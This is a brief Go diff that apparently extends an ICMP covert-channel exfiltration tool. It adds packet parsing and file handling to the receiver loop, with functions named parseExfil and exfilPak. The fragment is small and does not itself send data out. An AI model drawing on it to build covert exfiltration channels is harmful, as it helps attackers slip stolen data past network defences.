@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"log"
+	"os"
 
 	"golang.org/x/net/icmp"
 	"golang.org/x/net/ipv4"
@@ -70,6 +71,15 @@ func recv(host *string) {
 		if currentSeq != echoPak.Seq {
 			fmt.Println("packet out of order")
 			continue
+		}
+
+		exfilPak := parseExfil(echoPak.Data)
+		if exfilPak.first {
+			f, err := os.Open(exfilPak.filename)
+			if nil != err {
+				log.Fatalln(err)
+			}
+			defer f.Close()
 		}
 		currentSeq++
 		fmt.Printf("%x\n", echoPak.Data)
